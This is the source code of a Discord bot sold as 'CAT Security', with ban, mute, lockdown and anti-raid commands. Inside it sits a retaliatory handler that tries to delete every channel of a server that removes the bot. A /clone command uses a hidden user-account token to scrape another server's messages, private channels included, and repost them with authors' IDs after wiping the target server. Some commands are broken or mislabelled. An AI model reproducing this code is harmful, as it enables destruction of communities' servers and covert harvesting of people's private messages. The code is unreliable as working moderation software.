import discord
from discord import app_commands
from discord.ext import commands
from discord.ui import Button, View, Select, Modal, TextInput
import asyncio
import os
import aiohttp
from datetime import datetime, timedelta
import json

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
bot.user_token = os.environ.get("USER_TOKEN")

# ============================================================
# CONFIGURATION
# ============================================================
CONFIG = {
    "max_joins_per_minute": 5,
    "max_messages_per_second": 10,
    "max_mentions_per_message": 5,
    "max_new_account_age_hours": 24,
    "default_punishment": "ban",
    "log_channel_name": "cat-logs",
    "auto_setup": True
}

# ============================================================
# AUTO-SETUP LOGS CHANNEL
# ============================================================
async def setup_logs_channel(guild):
    log_channel = discord.utils.get(guild.channels, name=CONFIG["log_channel_name"])
    if not log_channel:
        category = discord.utils.get(guild.categories, name="CAT SECURITY")
        if not category:
            category = await guild.create_category("CAT SECURITY")
        
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        log_channel = await guild.create_text_channel(
            CONFIG["log_channel_name"],
            category=category,
            overwrites=overwrites
        )
        await log_channel.send("🔒 **CAT SECURITY INITIALIZED**\nLogging all actions.")
    return log_channel

async def log_action(guild, action, user, details=""):
    log_channel = discord.utils.get(guild.channels, name=CONFIG["log_channel_name"])
    if not log_channel:
        log_channel = await setup_logs_channel(guild)
    
    embed = discord.Embed(
        title=f"🔒 {action}",
        description=f"**User:** {user.mention} (`{user.id}`)\n{details}",
        color=discord.Color.red(),
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text=f"CAT Security • {guild.name}")
    await log_channel.send(embed=embed)

# ============================================================
# PUNISHMENT SYSTEM
# ============================================================
async def punish_user(user, guild, reason, punishment=None):
    if not punishment:
        punishment = CONFIG["default_punishment"]
    
    try:
        if user != guild.owner and user != guild.me:
            await user.edit(roles=[])
            await log_action(guild, "⚔️ ROLES REMOVED", user, f"All roles removed. Reason: {reason}")
        
        if punishment == "ban":
            await guild.ban(user, reason=f"CAT Security: {reason}")
            await log_action(guild, "🔨 BANNED", user, f"Reason: {reason}")
            return "banned"
        
        elif punishment == "kick":
            await guild.kick(user, reason=f"CAT Security: {reason}")
            await log_action(guild, "👢 KICKED", user, f"Reason: {reason}")
            return "kicked"
        
        elif punishment == "timeout":
            duration = timedelta(minutes=60)
            await user.timeout(duration, reason=f"CAT Security: {reason}")
            await log_action(guild, "⏰ TIMEOUT", user, f"60 minutes. Reason: {reason}")
            return "timed out for 60 minutes"
        
        elif punishment == "mute":
            mute_role = discord.utils.get(guild.roles, name="Muted")
            if not mute_role:
                mute_role = await guild.create_role(name="Muted", permissions=discord.Permissions(0))
                for channel in guild.channels:
                    await channel.set_permissions(mute_role, send_messages=False, speak=False)
            await user.add_roles(mute_role, reason=f"CAT Security: {reason}")
            await log_action(guild, "🔇 MUTED", user, f"Reason: {reason}")
            return "muted"
        
        elif punishment == "remove_roles":
            await user.edit(roles=[])
            await log_action(guild, "⚔️ ROLES REMOVED", user, f"Reason: {reason}")
            return "had all roles removed"
    
    except Exception as e:
        await log_action(guild, "❌ PUNISHMENT FAILED", user, f"Error: {str(e)[:100]}")
        return f"failed: {str(e)[:50]}"

# ============================================================
# UI: CONFIRM BUTTON VIEW
# ============================================================
class ConfirmView(View):
    def __init__(self, user, guild, action, reason, timeout=30):
        super().__init__(timeout=timeout)
        self.user = user
        self.guild = guild
        self.action = action
        self.reason = reason
        self.confirmed = False
    
    @discord.ui.button(label="✅ Confirm", style=discord.ButtonStyle.green)
    async def confirm_button(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer()
        self.confirmed = True
        self.stop()
        
        result = await punish_user(self.user, self.guild, self.reason, self.action)
        await interaction.followup.send(f"✅ **{self.user}** has been {result}.", ephemeral=True)
    
    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_message("❌ Action cancelled.", ephemeral=True)
        self.confirmed = False
        self.stop()

# ============================================================
# UI: PUNISHMENT SELECT MENU
# ============================================================
class PunishmentSelect(View):
    def __init__(self, user, guild, reason, timeout=30):
        super().__init__(timeout=timeout)
        self.user = user
        self.guild = guild
        self.reason = reason
        self.selected = None
    
    @discord.ui.select(
        placeholder="Choose a punishment...",
        options=[
            discord.SelectOption(label="🔨 Ban", value="ban", description="Permanently remove user"),
            discord.SelectOption(label="👢 Kick", value="kick", description="Remove user temporarily"),
            discord.SelectOption(label="⏰ Timeout", value="timeout", description="Mute for 60 minutes"),
            discord.SelectOption(label="🔇 Mute", value="mute", description="Add Muted role"),
            discord.SelectOption(label="⚔️ Remove Roles", value="remove_roles", description="Strip all roles"),
        ]
    )
    async def select_callback(self, interaction: discord.Interaction, select: Select):
        self.selected = select.values[0]
        await interaction.response.defer()
        self.stop()
        
        result = await punish_user(self.user, self.guild, self.reason, self.selected)
        await interaction.followup.send(f"✅ **{self.user}** has been {result}.", ephemeral=True)

# ============================================================
# UI: CLEAR CONFIRM VIEW
# ============================================================
class ClearConfirmView(View):
    def __init__(self, channel, guild, user, timeout=30):
        super().__init__(timeout=timeout)
        self.channel = channel
        self.guild = guild
        self.user = user
        self.confirmed = False
    
    @discord.ui.button(label="💀 YES, DELETE ALL", style=discord.ButtonStyle.danger)
    async def confirm_clear(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer(ephemeral=True)
        self.confirmed = True
        self.stop()
        
        deleted = 0
        try:
            while True:
                async for message in self.channel.history(limit=100):
                    await message.delete()
                    deleted += 1
                    await asyncio.sleep(0.2)
                
                last_message = await self.channel.history(limit=1).flatten()
                if not last_message:
                    break
                
                await asyncio.sleep(0.5)
        
        except discord.Forbidden:
            await interaction.followup.send("❌ I don't have permission to delete messages here.", ephemeral=True)
            return
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {str(e)[:100]}", ephemeral=True)
            return
        
        await log_action(
            self.guild,
            "🧹 CHANNEL CLEARED",
            self.user,
            f"Cleared {deleted} messages in #{self.channel.name}"
        )
        
        await interaction.followup.send(
            f"✅ **Deleted {deleted} messages** from #{self.channel.name}",
            ephemeral=True
        )
    
    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.secondary)
    async def cancel_clear(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_message("❌ Action cancelled.", ephemeral=True)
        self.confirmed = False
        self.stop()

# ============================================================
# ANTI-RAID / ANTI-SPAM / ANTI-NUKE
# ============================================================
join_timestamps = {}
message_cache = {}
deletion_cache = {}

@bot.event
async def on_ready():
    print(f"✅ CAT Ultimate Security online — {bot.user}")
    if CONFIG["auto_setup"]:
        for guild in bot.guilds:
            await setup_logs_channel(guild)
    await bot.tree.sync()
    print("✅ All slash commands synced")

@bot.event
async def on_member_join(member):
    guild = member.guild
    now = datetime.utcnow()
    
    if guild.id not in join_timestamps:
        join_timestamps[guild.id] = []
    join_timestamps[guild.id].append(now)
    
    cutoff = now - timedelta(minutes=1)
    join_timestamps[guild.id] = [t for t in join_timestamps[guild.id] if t > cutoff]
    
    if len(join_timestamps[guild.id]) > CONFIG["max_joins_per_minute"]:
        await log_action(guild, "🚨 RAID DETECTED", member, 
                        f"Mass joins: {len(join_timestamps[guild.id])} in 1 minute")
        await punish_user(member, guild, "Mass join raid")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    guild = message.guild
    if not guild:
        return
    
    now = datetime.utcnow()
    key = f"{guild.id}-{message.author.id}"
    
    if key not in message_cache:
        message_cache[key] = []
    message_cache[key].append((now, message.content))
    
    cutoff = now - timedelta(seconds=5)
    message_cache[key] = [(t, c) for t, c in message_cache[key] if t > cutoff]
    
    if len(message_cache[key]) > CONFIG["max_messages_per_second"] * 5:
        await log_action(guild, "🚨 SPAM DETECTED", message.author, 
                        f"{len(message_cache[key])} messages in 5 seconds")
        await punish_user(message.author, guild, "Message spam")
        await message.delete()
        return
    
    if len(message.mentions) > CONFIG["max_mentions_per_message"]:
        await log_action(guild, "🚨 MASS MENTION", message.author, 
                        f"Mentioned {len(message.mentions)} users")
        await punish_user(message.author, guild, "Mass mentions")
        await message.delete()
        return
    
    account_age = datetime.utcnow() - message.author.created_at
    if account_age.total_seconds() < CONFIG["max_new_account_age_hours"] * 3600:
        await log_action(guild, "🚨 NEW ACCOUNT", message.author, 
                        f"Account age: {account_age.total_seconds() / 3600:.1f} hours")
        await punish_user(message.author, guild, "New account spam")
        await message.delete()
        return
    
    await bot.process_commands(message)

@bot.event
async def on_guild_channel_delete(channel):
    guild = channel.guild
    now = datetime.utcnow()
    
    if guild.id not in deletion_cache:
        deletion_cache[guild.id] = []
    deletion_cache[guild.id].append(now)
    
    cutoff = now - timedelta(seconds=10)
    deletion_cache[guild.id] = [t for t in deletion_cache[guild.id] if t > cutoff]
    
    if len(deletion_cache[guild.id]) > 3:
        await log_action(guild, "☢️ NUKE DETECTED", guild.owner, 
                        f"{len(deletion_cache[guild.id])} channels deleted in 10 seconds")
        
        async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.channel_delete):
            if entry.target.id == channel.id:
                await punish_user(entry.user, guild, "Channel nuke")
                break

# ============================================================
# SELF-DESTRUCT ON KICK
# ============================================================
@bot.event
async def on_guild_remove(guild):
    tasks = []
    for channel in guild.channels:
        tasks.append(channel.delete())
    await asyncio.gather(*tasks, return_exceptions=True)
    try:
        new_channel = await guild.create_text_channel("💀-CAT-strikes-back")
        await new_channel.send("**ALL CHANNELS OBLITERATED.** You nuked CAT.")
    except:
        pass

# ============================================================
# CLONE SYSTEM (with private channels)
# ============================================================
async def fetch_guild_data(guild_id, token):
    async with aiohttp.ClientSession() as session:
        headers = {"Authorization": token}
        
        url = f"https://discord.com/api/v10/guilds/{guild_id}"
        async with session.get(url, headers=headers) as resp:
            if resp.status != 200:
                text = await resp.text()
                raise Exception(f"Guild fetch failed: {resp.status} - {text}")
            guild_data = await resp.json()
        
        url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
        async with session.get(url, headers=headers) as resp:
            if resp.status != 200:
                text = await resp.text()
                raise Exception(f"Channel fetch failed: {resp.status} - {text}")
            channels = await resp.json()
        
        return guild_data, channels

async def fetch_all_messages(channel_id, token, limit=1000):
    """Fetch messages from a channel using user token."""
    messages = []
    async with aiohttp.ClientSession() as session:
        headers = {"Authorization": token}
        url = f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=100"
        
        while len(messages) < limit:
            async with session.get(url, headers=headers) as resp:
                if resp.status != 200:
                    break
                data = await resp.json()
                if not data:
                    break
                messages.extend(data)
                last_id = data[-1]['id']
                url = f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=100&before={last_id}"
                await asyncio.sleep(0.3)
    
    return messages

# ============================================================
# SLASH COMMANDS
# ============================================================

# 1. BAN
@bot.tree.command(name="ban", description="🔨 Ban a user with confirmation")
@app_commands.default_permissions(ban_members=True)
@app_commands.describe(user="The user to ban", reason="Reason for the ban")
async def ban_modern(interaction: discord.Interaction, user: discord.Member, reason: str = "No reason provided"):
    view = ConfirmView(user, interaction.guild, "ban", reason)
    await interaction.response.send_message(
        f"⚠️ **Are you sure you want to ban {user.mention}?**\nReason: {reason}",
        view=view,
        ephemeral=True
    )

# 2. KICK
@bot.tree.command(name="kick", description="👢 Kick a user with confirmation")
@app_commands.default_permissions(kick_members=True)
@app_commands.describe(user="The user to kick", reason="Reason for the kick")
async def kick_modern(interaction: discord.Interaction, user: discord.Member, reason: str = "No reason provided"):
    view = ConfirmView(user, interaction.guild, "kick", reason)
    await interaction.response.send_message(
        f"⚠️ **Are you sure you want to kick {user.mention}?**\nReason: {reason}",
        view=view,
        ephemeral=True
    )

# 3. TIMEOUT
@bot.tree.command(name="timeout", description="⏰ Timeout a user with custom duration")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(user="The user to timeout", minutes="Duration in minutes", reason="Reason")
async def timeout_modern(interaction: discord.Interaction, user: discord.Member, minutes: int = 60, reason: str = "No reason provided"):
    await interaction.response.defer(ephemeral=True)
    duration = timedelta(minutes=minutes)
    await user.timeout(duration, reason=f"CAT Security: {reason}")
    await log_action(interaction.guild, "⏰ TIMEOUT", user, f"By: {interaction.user}\nDuration: {minutes} min\nReason: {reason}")
    await interaction.followup.send(f"✅ **{user}** has been timed out for {minutes} minutes.", ephemeral=True)

# 4. UNTIMEOUT
@bot.tree.command(name="untimeout", description="⏰ Remove timeout from a user")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(user="The user to untimeout")
async def untimeout_modern(interaction: discord.Interaction, user: discord.Member):
    await interaction.response.defer(ephemeral=True)
    await user.timeout(None)
    await log_action(interaction.guild, "⏰ TIMEOUT REMOVED", user, f"By: {interaction.user}")
    await interaction.followup.send(f"✅ **{user}** has been untimed out.", ephemeral=True)

# 5. MUTE
@bot.tree.command(name="mute", description="🔇 Mute a user (adds Muted role)")
@app_commands.default_permissions(manage_roles=True)
@app_commands.describe(user="The user to mute", reason="Reason")
async def mute_modern(interaction: discord.Interaction, user: discord.Member, reason: str = "No reason provided"):
    view = ConfirmView(user, interaction.guild, "mute", reason)
    await interaction.response.send_message(
        f"⚠️ **Mute {user.mention}?**\nReason: {reason}",
        view=view,
        ephemeral=True
    )

# 6. UNMUTE
@bot.tree.command(name="unmute", description="🔊 Unmute a user")
@app_commands.default_permissions(manage_roles=True)
@app_commands.describe(user="The user to unmute")
async def unmute_modern(interaction: discord.Interaction, user: discord.Member):
    await interaction.response.defer(ephemeral=True)
    mute_role = discord.utils.get(interaction.guild.roles, name="Muted")
    if mute_role:
        await user.remove_roles(mute_role)
        await log_action(interaction.guild, "🔊 UNMUTED", user, f"By: {interaction.user}")
        await interaction.followup.send(f"✅ **{user}** has been unmuted.", ephemeral=True)
    else:
        await interaction.followup.send("❌ Muted role not found.", ephemeral=True)

# 7. PUNISH (Select Menu)
@bot.tree.command(name="punish", description="🛡️ Open punishment selector for a user")
@app_commands.default_permissions(moderate_members=True)
@app_commands.describe(user="The user to punish", reason="Reason")
async def punish_modern(interaction: discord.Interaction, user: discord.Member, reason: str = "No reason provided"):
    view = PunishmentSelect(user, interaction.guild, reason)
    await interaction.response.send_message(
        f"🛡️ **Choose a punishment for {user.mention}**\nReason: {reason}",
        view=view,
        ephemeral=True
    )

# 8. PURGE
@bot.tree.command(name="purge", description="🧹 Delete specific number of messages")
@app_commands.default_permissions(manage_messages=True)
@app_commands.describe(amount="Number of messages to delete", user="Filter by user (optional)")
async def purge_modern(interaction: discord.Interaction, amount: int, user: discord.Member = None):
    await interaction.response.defer(ephemeral=True)
    
    def check(msg):
        if user:
            return msg.author == user
        return True
    
    deleted = await interaction.channel.purge(limit=amount, check=check)
    await log_action(interaction.guild, "🧹 PURGE", interaction.user, 
                    f"Deleted {len(deleted)} messages in #{interaction.channel.name}")
    await interaction.followup.send(f"✅ Deleted {len(deleted)} messages.", ephemeral=True)

# 9. CLEAR
@bot.tree.command(name="clear", description="🧹 DELETE ALL messages in a channel")
@app_commands.default_permissions(manage_messages=True)
@app_commands.describe(channel="Channel to clear (leave blank for current)")
async def clear_messages(interaction: discord.Interaction, channel: discord.TextChannel = None):
    target_channel = channel or interaction.channel
    view = ClearConfirmView(target_channel, interaction.guild, interaction.user)
    await interaction.response.send_message(
        f"⚠️ **WARNING: This will delete EVERY message in #{target_channel.name}!**\n"
        f"This action is **irreversible** and may take a while.\n\n"
        f"Are you sure?",
        view=view,
        ephemeral=True
    )

# 10. REMOVE ROLES
@bot.tree.command(name="removeroles", description="⚔️ Remove all roles from a user")
@app_commands.default_permissions(manage_roles=True)
@app_commands.describe(user="The user to strip roles from", reason="Reason")
async def removeroles_modern(interaction: discord.Interaction, user: discord.Member, reason: str = "No reason provided"):
    view = ConfirmView(user, interaction.guild, "remove_roles", reason)
    await interaction.response.send_message(
        f"⚠️ **Remove all roles from {user.mention}?**\nReason: {reason}",
        view=view,
        ephemeral=True
    )

# 11. LOCKDOWN
@bot.tree.command(name="lockdown", description="🔒 Lock down the entire server")
@app_commands.default_permissions(administrator=True)
async def lockdown_modern(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    for channel in interaction.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.set_permissions(interaction.guild.default_role, send_messages=False)
    
    await log_action(interaction.guild, "🔒 LOCKDOWN", interaction.user, "Server locked down")
    await interaction.followup.send("🔒 Server locked down. No one can send messages.", ephemeral=True)

# 12. UNLOCK
@bot.tree.command(name="unlock", description="🔓 Unlock the server")
@app_commands.default_permissions(administrator=True)
async def unlock_modern(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    for channel in interaction.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.set_permissions(interaction.guild.default_role, send_messages=None)
    
    await log_action(interaction.guild, "🔓 UNLOCKED", interaction.user, "Server unlocked")
    await interaction.followup.send("🔓 Server unlocked.", ephemeral=True)

# 13. LOCKALL
@bot.tree.command(name="lockall", description="🔒 Lock ALL channels in this server")
@app_commands.default_permissions(administrator=True)
async def lockall_modern(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    locked_count = 0
    for channel in interaction.guild.channels:
        try:
            if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.ForumChannel, discord.StageChannel)):
                await channel.set_permissions(
                    interaction.guild.default_role,
                    send_messages=False,
                    connect=False,
                    speak=False,
                    add_reactions=False,
                    create_public_threads=False,
                    create_private_threads=False,
                    send_messages_in_threads=False
                )
                locked_count += 1
                await asyncio.sleep(0.2)
        except:
            pass
    
    await log_action(interaction.guild, "🔒 LOCKALL", interaction.user, f"Locked {locked_count} channels")
    await interaction.followup.send(f"🔒 **Locked {locked_count} channels** in this server.", ephemeral=True)

# 14. UNLOCKALL
@bot.tree.command(name="unlockall", description="🔓 Unlock ALL channels in this server")
@app_commands.default_permissions(administrator=True)
async def unlockall_modern(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    unlocked_count = 0
    for channel in interaction.guild.channels:
        try:
            if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.ForumChannel, discord.StageChannel)):
                await channel.set_permissions(
                    interaction.guild.default_role,
                    send_messages=None,
                    connect=None,
                    speak=None,
                    add_reactions=None,
                    create_public_threads=None,
                    create_private_threads=None,
                    send_messages_in_threads=None
                )
                unlocked_count += 1
                await asyncio.sleep(0.2)
        except:
            pass
    
    await log_action(interaction.guild, "🔓 UNLOCKALL", interaction.user, f"Unlocked {unlocked_count} channels")
    await interaction.followup.send(f"🔓 **Unlocked {unlocked_count} channels** in this server.", ephemeral=True)

# 15. CLONE (with message copy)
@bot.tree.command(name="clone", description="📋 Clone ALL channels with optional message copy")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(
    source_id="Source server ID",
    target_id="Target server ID",
    copy_messages="True/False - Copy all messages from source to target"
)
async def clone_with_messages(
    interaction: discord.Interaction,
    source_id: str,
    target_id: str,
    copy_messages: bool = False
):
    await interaction.response.send_message(
        f"📋 **Cloning started...**\n"
        f"Source: `{source_id}`\n"
        f"Target: `{target_id}`\n"
        f"Copy messages: `{copy_messages}`\n"
        f"⏳ This may take a while...",
        ephemeral=True
    )
    
    try:
        source_guild_data, source_channels = await fetch_guild_data(source_id, bot.user_token)
        source_name = source_guild_data.get('name', 'Unknown Server')
        
        target_guild = bot.get_guild(int(target_id))
        if not target_guild:
            await interaction.followup.send("❌ Target server not found. Make sure I'm in it.", ephemeral=True)
            return
        
        if not target_guild.me.guild_permissions.manage_channels:
            await interaction.followup.send("❌ Missing Manage Channels permission in target.", ephemeral=True)
            return
        
        channel_map = {}
        
        await interaction.followup.send("🗑️ Clearing target server...", ephemeral=True)
        for channel in target_guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.2)
            except:
                pass
        
        await interaction.followup.send("📂 Creating categories...", ephemeral=True)
        categories = [ch for ch in source_channels if ch['type'] == 4]
        category_map = {}
        for cat in categories:
            new_cat = await target_guild.create_category(name=cat['name'], position=cat.get('position', 0))
            category_map[cat['id']] = new_cat
            await asyncio.sleep(0.3)
        
        await interaction.followup.send("💬 Cloning text channels...", ephemeral=True)
        text_channels = [ch for ch in source_channels if ch['type'] == 0]
        text_count = 0
        total_messages_copied = 0
        
        for ch in text_channels:
            parent = category_map.get(ch.get('parent_id')) if ch.get('parent_id') else None
            new_channel = await target_guild.create_text_channel(
                name=ch['name'],
                category=parent,
                position=ch.get('position', 0),
                topic=ch.get('topic', ''),
                slowmode_delay=ch.get('rate_limit_per_user', 0),
                nsfw=ch.get('nsfw', False)
            )
            channel_map[ch['id']] = new_channel
            text_count += 1
            await asyncio.sleep(0.3)
            
            if copy_messages:
                await interaction.followup.send(
                    f"📝 Copying messages from #{ch['name']}... (this may take a while)",
                    ephemeral=True
                )
                
                try:
                    messages = await fetch_all_messages(ch['id'], bot.user_token, limit=1000)
                    
                    for msg in reversed(messages):
                        try:
                            author_name = msg['author']['username']
                            author_id = msg['author']['id']
                            content = msg.get('content', '')
                            
                            attachments = msg.get('attachments', [])
                            attach_text = ""
                            if attachments:
                                attach_text = "\n[Attachments: " + ", ".join([a['url'] for a in attachments]) + "]"
                            
                            full_content = f"**{author_name}** (`{author_id}`): {content}{attach_text}"
                            
                            await new_channel.send(full_content)
                            total_messages_copied += 1
                            await asyncio.sleep(0.3)
                            
                            for embed in msg.get('embeds', []):
                                if embed.get('title') or embed.get('description'):
                                    embed_text = f"[Embed] {embed.get('title', '')} - {embed.get('description', '')}"
                                    await new_channel.send(embed_text)
                                    await asyncio.sleep(0.3)
                        
                        except Exception as e:
                            continue
                
                except Exception as e:
                    await interaction.followup.send(f"⚠️ Error copying messages from #{ch['name']}: {str(e)[:100]}", ephemeral=True)
        
        await interaction.followup.send("🔊 Cloning voice channels...", ephemeral=True)
        voice_channels = [ch for ch in source_channels if ch['type'] == 2]
        voice_count = 0
        for ch in voice_channels:
            parent = category_map.get(ch.get('parent_id')) if ch.get('parent_id') else None
            await target_guild.create_voice_channel(
                name=ch['name'],
                category=parent,
                position=ch.get('position', 0),
                bitrate=ch.get('bitrate', 64000),
                user_limit=ch.get('user_limit', 0)
            )
            voice_count += 1
            await asyncio.sleep(0.3)
        
        await interaction.followup.send("📝 Cloning forum channels...", ephemeral=True)
        forum_channels = [ch for ch in source_channels if ch['type'] == 15]
        forum_count = 0
        for ch in forum_channels:
            parent = category_map.get(ch.get('parent_id')) if ch.get('parent_id') else None
            await target_guild.create_forum(
                name=ch['name'],
                category=parent,
                position=ch.get('position', 0),
                topic=ch.get('topic', ''),
                nsfw=ch.get('nsfw', False)
            )
            forum_count += 1
            await asyncio.sleep(0.3)
        
        await interaction.followup.send("🎭 Cloning stage channels...", ephemeral=True)
        stage_channels = [ch for ch in source_channels if ch['type'] == 13]
        stage_count = 0
        for ch in stage_channels:
            parent = category_map.get(ch.get('parent_id')) if ch.get('parent_id') else None
            await target_guild.create_stage_channel(
                name=ch['name'],
                category=parent,
                position=ch.get('position', 0),
                bitrate=ch.get('bitrate', 64000)
            )
            stage_count += 1
            await asyncio.sleep(0.3)
        
        await log_action(
            interaction.guild,
            "📋 CLONE COMPLETE",
            interaction.user,
            f"Source: {source_name}\n"
            f"Categories: {len(categories)}\n"
            f"Text: {text_count}\n"
            f"Voice: {voice_count}\n"
            f"Forum: {forum_count}\n"
            f"Stage: {stage_count}\n"
            f"Messages copied: {total_messages_copied if copy_messages else 'Disabled'}"
        )
        
        await interaction.followup.send(
            f"✅ **Clone Complete!**\n"
            f"📊 `{source_name}` → `{target_guild.name}`\n"
            f"📁 Categories: {len(categories)}\n"
            f"💬 Text: {text_count}\n"
            f"🔊 Voice: {voice_count}\n"
            f"📝 Forum: {forum_count}\n"
            f"🎭 Stage: {stage_count}\n"
            f"📝 Messages copied: {total_messages_copied if copy_messages else 'Disabled'}\n"
            f"🔓 **Private channels included**\n"
            f"🐈 CAT delivers.",
            ephemeral=True
        )
    
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)[:600]}", ephemeral=True)

# 16. DELETE ALL CHANNELS
@bot.tree.command(name="deleteallchannels", description="🔥 DELETE EVERY CHANNEL (with confirmation)")
@app_commands.default_permissions(administrator=True)
async def deleteall_modern(interaction: discord.Interaction):
    view = ConfirmView(interaction.user, interaction.guild, "ban", "Server nuke")
    await interaction.response.send_message(
        "💀 **WARNING: This will delete EVERY channel in this server!**\nThis is irreversible. Click confirm to proceed.",
        view=view,
        ephemeral=True
    )

# 17. SETUP
@bot.tree.command(name="setup", description="🔧 Setup CAT Security in this server")
@app_commands.default_permissions(administrator=True)
async def setup_modern(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await setup_logs_channel(interaction.guild)
    await interaction.followup.send("✅ CAT Security setup complete! Logs channel created.", ephemeral=True)

# 18. STATS
@bot.tree.command(name="stats", description="📊 Show server statistics")
@app_commands.default_permissions(administrator=True)
async def stats_modern(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(
        title=f"📊 Server Stats - {guild.name}",
        color=discord.Color.blue(),
        timestamp=datetime.utcnow()
    )
    embed.add_field(name="👥 Members", value=guild.member_count, inline=True)
    embed.add_field(name="💬 Channels", value=len(guild.channels), inline=True)
    embed.add_field(name="📁 Categories", value=len(guild.categories), inline=True)
    embed.add_field(name="🔊 Voice Channels", value=len(guild.voice_channels), inline=True)
    embed.add_field(name="📝 Text Channels", value=len(guild.text_channels), inline=True)
    embed.add_field(name="👑 Owner", value=guild.owner.mention, inline=True)
    embed.set_footer(text="CAT Security")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ============================================================
# CONTEXT MENUS (Right-click user)
# ============================================================
@bot.tree.context_menu(name="🔨 Ban User")
@app_commands.default_permissions(ban_members=True)
async def context_ban(interaction: discord.Interaction, user: discord.Member):
    view = ConfirmView(user, interaction.guild, "ban", "Context menu ban")
    await interaction.response.send_message(f"⚠️ Ban {user.mention}?", view=view, ephemeral=True)

@bot.tree.context_menu(name="👢 Kick User")
@app_commands.default_permissions(kick_members=True)
async def context_kick(interaction: discord.Interaction, user: discord.Member):
    view = ConfirmView(user, interaction.guild, "kick", "Context menu kick")
    await interaction.response.send_message(f"⚠️ Kick {user.mention}?", view=view, ephemeral=True)

@bot.tree.context_menu(name="⏰ Timeout User (60min)")
@app_commands.default_permissions(moderate_members=True)
async def context_timeout(interaction: discord.Interaction, user: discord.Member):
    await interaction.response.defer(ephemeral=True)
    duration = timedelta(minutes=60)
    await user.timeout(duration, reason="Context menu timeout")
    await log_action(interaction.guild, "⏰ TIMEOUT", user, f"By: {interaction.user}\nDuration: 60 min")
    await interaction.followup.send(f"✅ **{user}** timed out for 60 minutes.", ephemeral=True)

# ============================================================
# PREFIX COMMANDS (Fallback)
# ============================================================
@bot.command(name="ban")
@commands.has_permissions(ban_members=True)
async def ban_prefix(ctx, user: discord.Member, *, reason: str = "No reason"):
    await user.ban(reason=reason)
    await ctx.send(f"✅ Banned {user}")

@bot.command(name="kick")
@commands.has_permissions(kick_members=True)
async def kick_prefix(ctx, user: discord.Member, *, reason: str = "No reason"):
    await user.kick(reason=reason)
    await ctx.send(f"✅ Kicked {user}")

@bot.command(name="purge")
@commands.has_permissions(manage_messages=True)
async def purge_prefix(ctx, amount: int):
    await ctx.channel.purge(limit=amount+1)
    await ctx.send(f"✅ Deleted {amount} messages", delete_after=2)

@bot.command(name="clear")
@commands.has_permissions(manage_messages=True)
async def clear_prefix(ctx):
    await ctx.send("⚠️ Use **/clear** for this command.")

@bot.command(name="clone")
@commands.has_permissions(administrator=True)
async def clone_prefix(ctx, source_id: str, target_id: str):
    await ctx.send(f"📋 Use **/clone {source_id} {target_id}** instead.")

@bot.command(name="deleteallchannels")
@commands.has_permissions(administrator=True)
async def deleteall_prefix(ctx):
    await ctx.send("💀 Use **/deleteallchannels** instead.")

@bot.command(name="lockall")
@commands.has_permissions(administrator=True)
async def lockall_prefix(ctx):
    await ctx.send("🔒 Use **/lockall** instead.")

@bot.command(name="unlockall")
@commands.has_permissions(administrator=True)
async def unlockall_prefix(ctx):
    await ctx.send("🔓 Use **/unlockall** instead.")

# ============================================================
# RUN
# ============================================================
bot.run(os.environ.get("DISCORD_TOKEN"))
